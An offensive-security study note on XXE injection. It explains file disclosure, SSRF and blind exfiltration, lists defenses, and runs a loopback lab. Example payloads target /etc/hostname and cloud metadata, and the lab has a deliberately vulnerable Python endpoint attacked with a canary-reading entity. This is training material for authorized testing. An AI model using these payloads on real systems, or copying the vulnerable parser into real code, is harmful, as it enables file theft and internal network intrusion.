---
title: "XML External Entity Testing"
aliases: ["XXE Testing", "XML External Entity", "XXE"]
tags: [tree/offensive, cyber/offensive/web/parsers/xxe, type/technique, level/operator]
Domain: "[[File, Parser & Serialization Security]]"
Color: "#DC143C"
---

# 📃 XML External Entity Testing

> [!warning] Authorized simulation only
> XXE can read files and reach *internal* systems (SSRF). Prove it only with a benign canary file or a harmless local marker — never point an entity at a real internal service or sensitive file. Test in-scope systems you build or are authorized to assess.

## Parent Learning Order
File Inclusion & Path Traversal -> File Upload Security Testing -> Insecure Deserialization Testing -> XML External Entity Testing

## Start at Zero: When a Parser Fetches What You Tell It

XML is more than a data format — it has a document type definition (DTD) that can declare **entities**, reusable snippets referenced with `&name;`. Most entities are harmless (`&amp;` → `&`), but XML also supports **external entities** that tell the parser to fetch content from a URI: `<!ENTITY xxe SYSTEM "file:///etc/hostname">`. When the parser resolves `&xxe;`, it *reads that file* and inserts the contents. If an application parses attacker-supplied XML with external entities enabled, the attacker declares an entity pointing at a file or URL, and its contents flow into the response — **XML External Entity (XXE) injection**.

The root cause is a powerful parser feature (external entity resolution) left enabled on untrusted input. Unlike deserialization, XXE does not usually give code execution — but it gives **file disclosure** and **server-side request forgery**, both serious, and it appears anywhere XML is parsed (SOAP, SVG uploads, document formats, config imports).

> [!tip] The analogy, and where it breaks
> XXE is like a form that says "for your address, write 'see file X on the office server' and the clerk will go fetch and copy whatever file X contains." The analogy breaks on reach: the clerk will fetch not just office files but anything the *server* can reach — including internal systems behind the firewall the attacker could never touch directly, which is why XXE-to-SSRF is so dangerous.

**Prerequisites:** XML structure and DTDs, the SSRF concept, and the file-path leaf.

## The Two Payoffs: File Read and SSRF

XXE delivers two attack outcomes from the same mechanism:

**File disclosure** — the entity points at a local file; its contents appear in the response:
```text
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<data>&x;</data>    ->  response contains the file's contents
```

**Server-Side Request Forgery** — the entity points at an internal URL the *server* can reach but the attacker cannot:
```text
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">   (cloud metadata, internal-only)
```
The parser makes the request from inside the network, and the internal response comes back to the attacker. This turns XXE into a pivot into the internal infrastructure — the reason the warning insists on benign targets only.

**Blind XXE** handles the case where the entity content is not reflected: the payload exfiltrates data to an attacker-controlled server via an out-of-band request, detected by observing that request rather than the response. It is more complex and equally must be proven with benign markers.

## Where XXE Hides

XXE is not just in obvious XML APIs. It appears wherever XML is parsed, often unexpectedly:

- **SOAP/XML web services** (the legacy-web-services leaf's signature flaw)
- **SVG image uploads** — SVG is XML, so an "image" upload can carry an XXE payload
- **Document formats** — DOCX, XLSX, PDF (all contain XML)
- **Configuration and data imports** that accept XML
- **SAML** authentication messages (XML-based)

This breadth is why XXE testing means asking "is XML parsed here?" at every input, not just at endpoints labeled "XML API."

```mermaid
flowchart TD
    I["Any XML input (API, SVG, DOCX, SAML)"] --> P{"Parser resolves external entities?"}
    P -->|"No (secure config)"| S["Safe"]
    P -->|"Yes"| E{"Entity target?"}
    E -->|"file://"| F["File disclosure"]
    E -->|"http:// internal"| SSRF["SSRF into internal network"]
    E -->|"out-of-band"| B["Blind XXE: exfil via attacker server"]
    F --> PR["Prove with a BENIGN canary, never real internal targets"]
    SSRF --> PR
```

## Failure Modes and Interpretation

- **Pointing at real internal targets.** An XXE probe aimed at cloud metadata or an internal service could cause real disclosure or side effects. Prove with a benign canary file you placed, or a harmless local marker — never a live sensitive target.
- **Entity not reflected.** If the response does not echo the entity, the flaw may still be present as *blind* XXE — test out-of-band before concluding it is safe.
- **Parser hardening varies.** Modern libraries disable external entities by default, so a payload that fails may mean a secure parser *or* a bypass is needed (some parsers have quirks). Confirm the parser and version.
- **Unexpected XML surfaces.** Missing XXE because the input was an SVG or DOCX (not an obvious XML endpoint) is a common gap — test every place XML could be parsed.
- **Encoding and DTD tricks.** Character encodings and parameter entities can bypass naive filters; test variants as with any parser fix.

## Security Implications — Detection & Defense

- **Disable external entity and DTD processing** in every XML parser — the definitive, zero-cost fix that closes the entire class. This is a parser configuration flag, and its default-off in modern libraries is why XXE has declined.
- **Least-privilege the parsing process** and restrict its outbound network access, so even a successful XXE reaches few files and cannot pivot to internal services (defeating the SSRF payoff).
- **Validate and sanitize XML inputs**, and prefer less-powerful data formats (JSON) where XML's features are not needed.
- **Test the unexpected surfaces:** SVG uploads, document imports, and SAML flows all need the same external-entity-disabled configuration.
- **Detection** looks for the SSRF signature — the parser making unexpected outbound requests (especially to internal or metadata addresses) — and unusual file access by the parsing process, since the payload itself is valid XML.

## Authorized Lab: Prove XXE File Disclosure Safely

> [!info] Runs on one Linux machine — builds an XML parser endpoint with external entities enabled, tested with a canary
> Loopback-bound; the entity reads only a canary you place, never a real target. Step 5 removes everything.

### Step 1 — Build an endpoint that resolves external entities, plus a canary

```bash
echo "XXE-CANARY-5567" > /tmp/xxe-secret.txt
cat > /tmp/xxesvc.py << 'EOF'
import http.server
from xml.dom.pulldom import parseString, START_ELEMENT
# lxml/defusedxml would matter in real apps; here we simulate resolution with a regex reader
import re
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
        # simulate a parser resolving SYSTEM file entities (the vulnerable behavior)
        m=re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"file://([^"]+)"',body)
        out="(no entity)"
        if m:
            try: out=open(m.group(1)).read().strip()
            except: out="(not found)"
        self.send_response(200); self.end_headers()
        self.wfile.write(f"<result>{out}</result>".encode())
    def log_message(self,*a): pass
http.server.HTTPServer(("127.0.0.1",8105),H).serve_forever()
EOF
python3 /tmp/xxesvc.py &>/dev/null &
sleep 1; echo "XML endpoint up on 127.0.0.1:8105, canary at /tmp/xxe-secret.txt"
```

```text
XML endpoint up on 127.0.0.1:8105, canary at /tmp/xxe-secret.txt
```

### Step 2 — Normal XML (baseline)

```bash
curl -s -X POST -d '<data>hello</data>' http://127.0.0.1:8105/
```

```text
<result>(no entity)</result>
```

Plain XML with no entity — nothing fetched.

### Step 3 — XXE payload targeting a BENIGN canary (the finding)

```bash
curl -s -X POST http://127.0.0.1:8105/ \
  --data '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///tmp/xxe-secret.txt"> ]><data>&xxe;</data>'
```

```text
<result>XXE-CANARY-5567</result>
```

The parser resolved the external entity and returned the **canary contents** — XXE file disclosure, proven. The entity pointed at a canary you placed, not `/etc/passwd` or an internal URL: the vulnerability is demonstrated with zero real exposure. On a vulnerable production parser this reads arbitrary files or pivots to internal services.

### Step 4 — Note the SSRF dimension without exercising it

```bash
echo "File disclosure: CONFIRMED (canary read via external entity)."
echo "SSRF dimension: the SAME flaw with <!ENTITY x SYSTEM \"http://INTERNAL/\"> would make the SERVER fetch"
echo "internal URLs. NOT exercised here — that would touch real internal systems. Fix: disable external entities."
```

```text
File disclosure: CONFIRMED (canary read via external entity).
SSRF dimension: the SAME flaw with <!ENTITY x SYSTEM "http://INTERNAL/"> would make the SERVER fetch
internal URLs. NOT exercised here — that would touch real internal systems. Fix: disable external entities.
```

### Step 5 — Cleanup

```bash
kill %1 2>/dev/null; rm -f /tmp/xxesvc.py /tmp/xxe-secret.txt; wait 2>/dev/null
ls /tmp/xxe-secret.txt 2>&1 | tail -1
```

```text
ls: cannot access '/tmp/xxe-secret.txt': No such file or directory
```

**What you should now be able to do:** explain how external entities cause file disclosure and SSRF, prove XXE with a benign canary, recognize the unexpected XML surfaces (SVG, DOCX, SAML), and articulate why disabling external-entity processing is the definitive fix.

## Crook → Operator → Root Checkpoint

- **Crook:** Explain what an external entity is and why a parser resolving one on untrusted input causes XXE.
- **Operator:** Prove XXE file disclosure with a benign canary, and identify the unexpected surfaces (SVG uploads, documents, SAML) where XML is parsed.
- **Root:** Explain the XXE-to-SSRF pivot into internal networks, why disabling external-entity/DTD processing closes the whole class, and how detection looks for the parser's unexpected outbound requests.

---
> 🔼 Up: [[File, Parser & Serialization Security]]
